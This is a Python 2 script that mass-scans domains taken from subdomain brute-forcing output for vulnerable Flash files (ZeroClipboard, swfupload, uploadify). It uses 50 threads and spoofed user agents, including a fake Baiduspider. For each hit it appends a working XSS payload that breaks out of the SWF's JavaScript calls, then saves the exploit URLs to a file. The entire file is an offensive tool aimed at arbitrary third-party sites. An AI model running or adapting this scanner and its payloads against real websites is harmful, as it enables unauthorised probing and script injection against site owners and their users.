#encoding:utf-8
'''
__author__="M0rk"
Date=2016/7/10
'''
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: whoamisb
# @Date: 2016-06-05 20:04:07
# @Last Modified by: whoamisb
# @Last Modified time: 2016-06-14 20:29:35

import requests
from bs4 import BeautifulSoup
import re
import sys
import urlparse
import random
from multiprocessing.dummy import Pool as ThreadPool
from binascii import b2a_hex, a2b_hex

def read_file(file_name):
    file_list = []
    file_object = open(file_name, 'r')
    for line in file_object.readlines():
        file_list.append(unicode(line.strip()))#设置成Unicode编码，不然后面会出错，utf-8无法解码
    file_object.close()
    return file_list


def get_user_agent():
    user_agents = [
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52", ]
    return random.choice(user_agents)

def write_file(file_name, file_list):
    file_object = open(file_name, 'w')
    file_content = ""
    for line in file_list:
        file_content += line + '\n'
    file_object.write(file_content)
    file_object.close()

def get_payload_list():
    payload_list = [r"/ZeroClipboard.swf",
                    r"/flash/ZeroClipboard.swf",
                    r"/js/ZeroClipboard.swf",
                    r"/swf/ZeroClipboard.swf",
                    r"/swfupload.swf",
                    r"/swfupload/swfupload.swf",
                    r"/uploadify/uploadify.swf",
                    r"/upload/swfupload.swf",
                    r"/images/swfupload.swf",
                    r"/static/swfupload.swf",
                    r"/common/swfupload.swf"]
    return payload_list

def get_url_code(url):
    requests.adapters.DEFAULT_RETRIES = 5
    s = requests.session()
    s.keep_alive = False
    user_agent=get_user_agent()
    headers = {'Connection': 'close',#解决Max retries exceeded with url错误
            'User-Agent': user_agent}
    try:
        r = requests.get(url, headers=headers, timeout=3, allow_redirects=False)
    except Exception, e:
        print e
        return False
    if r.status_code == 200:
        if b2a_hex(r.content[:3]) == "435753" or b2a_hex(r.content[:3]) == "465753":#CWS或者FWS
            return True
    return False

def get_exist_url(url_list, payload_list):
    exist_url_list = []
    #考虑多线程，单线程1个网站就需要100多秒
    new_url_list = []
    for url in url_list:
        for payload in payload_list:
            new_url = url + payload
            new_url_list.append(new_url)
    pool = ThreadPool(50)
    results = pool.map(get_url_code, new_url_list)
    pool.close()
    pool.join()
    for i in range(len(results)):
        if results[i] == True:
            print "[vul]" + new_url_list[i]
            exist_url_list.append(new_url_list[i])

    return exist_url_list

def process_url(url):
    url_list = []
    u = urlparse.urlparse(url)
    reg = r"^[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?$"
    m = re.match(reg, u.netloc)
    if not m:#如果不匹配
        return url_list
    if u.path == "" or u.path.count("/") <= 1:
        url = u.scheme + "://" + u.netloc
        url_list.append(url)
        return url_list
    path = u.path
    for i in range(path.count("/")):
        path = path[:path.rindex("/")]
        url = u.scheme + "://" + u.netloc + path
        url_list.append(url)
    return url_list

def get_url_list(domain_name):
    print '*******************************'
    print domain_name
    print '*******************************'
    url_list = []
    user_agent=get_user_agent()
    home_page = "http://"+domain_name
    headers = {'Connection': 'close',
                'User-Agent': user_agent}
    data = ''
    try:
        r = requests.get(home_page,headers=headers,timeout=3)
        data = r.text.decode('gbk', 'ignore').encode('utf-8')
    except Exception, e:
        print e

    #link_list =re.findall(r"(?<=src=\").+?(?=\")|(?<=src=\').+?(?=\')" ,data)
    #(?<=)之前的字符串内容，(?=)之后的字符串内容
    link_list =re.findall(r"(?<=href=\").+?(?=\")|(?<=href=\').+?(?=')|(?<=src=\").+?(?=\")|(?<=src=\').+?(?=')|(?<=action=\").+?(?=\")|(?<=action=\').+?(?=')" ,data)
    for url in link_list:
        url = url.strip()#去除首尾空格
        if r"/" in url:
            if not url.startswith("http"):#只要前面没有http，就加上主页url
                url = home_page + r"/" + url
            url_list += process_url(url)
    url_list = list(set(url_list))
    for url in url_list:
        print url
    return url_list

def get_domain_list(file_list):
    domain_list = []
    for line in file_list:
        if " " in line:#一种可能是www.baidu.com 1.2.3.4格式
            domain_name = line.split(" ")[0]
        else:#这种直接是域名列表
            domain_name =line
        domain_name = domain_name.strip()
        reg = r"^[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?$"
        m = re.match(reg, domain_name)
        if m:#如果匹配
            domain_list.append(domain_name)
    return domain_list

def find_flash_xss(file_name):#从subDomainsBrute或者Layer子域名挖掘机得到的域名列表
    reload(sys)
    sys.setdefaultencoding('utf-8')
    flash_xss_list = []
    file_list = read_file(file_name)
    domain_list = get_domain_list(file_list)
    payload_list = get_payload_list()
    for domain_name in domain_list:
        url_list = get_url_list(domain_name)
        exist_url_list = get_exist_url(url_list, payload_list)
        flash_xss_list += exist_url_list
    flash_xss_list = list(set(flash_xss_list))
    new_flash_xss_list = []
    for flash_xss_url in flash_xss_list:
        if "ZeroClipboard.swf" in flash_xss_url:
            flash_xss_url += "?id=\%22))}catch(e){(alert)(/XSS/.source);}//&width=500&height=500"
        if "swfupload.swf" in flash_xss_url:
            flash_xss_url += "?movieName=aaa%22])}catch(e){(alert)(1)};//"
        if "uploadify.swf" in flash_xss_url:
            flash_xss_url+="?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf"
        new_flash_xss_list.append(flash_xss_url)
        print '[vul]' + flash_xss_url
    write_file("xianzhi_result.txt", new_flash_xss_list)

if __name__ == '__main__':
    file_name = sys.argv[1]
    find_flash_xss(file_name)


